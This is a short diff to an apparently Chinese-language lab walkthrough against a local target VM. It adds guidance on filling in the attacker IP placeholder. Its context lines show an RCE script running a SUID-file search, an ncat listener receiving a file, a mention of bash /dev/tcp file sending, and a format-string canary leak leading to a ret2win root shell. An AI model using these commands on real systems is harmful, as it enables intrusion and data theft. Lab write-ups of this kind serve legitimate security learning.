@@ -572,6 +572,8 @@ python baji_rce.py "find / -xdev -perm -4000 -type f -printf '%M %u %g %p\n' 2>/
 cmd /c "ncat.exe -lvnp 9001 > vaultd.elf"
 ```
 
+这是本地靶机，下面的 `<攻击机IP>` 填靶机能访问到的攻击机/宿主机 IP，不是 `127.0.0.1`。比如 VirtualBox Host-only 常见是 `192.168.56.1`，也可以填 Kali 在同网段的 IP。
+
 目标机没有 `nc` 的话，可以用 bash 的 `/dev/tcp` 发送：
 
 ```bash
@@ -697,6 +699,7 @@ support_ticket 的 printf(buf) 泄露 canary
 -> 返回到 hidden_maintenance_shell
 -> 执行 /bin/sh -p 拿 root shell
 ```
+
 # 自动化 ret2win
 
 为了保证泄露 canary 和溢出发生在同一个 `/opt/vaultd` 进程里，我写了一个 Python 脚本在目标机上执行：
